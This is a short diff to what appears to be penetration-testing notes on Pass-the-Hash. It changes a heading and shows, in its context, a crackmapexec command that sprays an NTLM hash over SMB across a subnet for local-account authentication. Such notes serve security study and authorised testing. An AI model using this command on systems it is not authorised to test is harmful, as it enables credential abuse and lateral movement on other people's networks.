@@ -1,6 +1,6 @@
 # Pass-The-Hash
 
-## with Local Accounts
+## with Local Accounts and Domain Accounts
 
 ```
 crackmapexec smb 192.168.183.0/24 -u "Frank Castle" -H <hash> --local-auth
